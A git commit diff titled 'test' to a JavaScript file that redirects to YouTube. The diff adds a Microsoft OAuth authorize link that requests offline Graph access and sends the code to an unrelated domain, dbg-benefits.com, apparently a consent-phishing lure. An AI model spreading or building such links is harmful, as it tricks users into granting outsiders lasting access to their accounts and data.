3107a50d2a430df44f2f18def191037efbac8c21
wowter-code <ionut.horia.as@gmail.com>
2026-04-15 12:48:41 +0300

    test
    test

--- x.js
+++ x.js
@@ -1,1 +1,4 @@
 window.location = "https://www.youtube.com/";
+
+https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=f0f1aad3-6ddf-4a22-a819-93debecb419f&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2Fdbg-benefits.com%2Flogin%2Fauthorized&response_mode=query
+
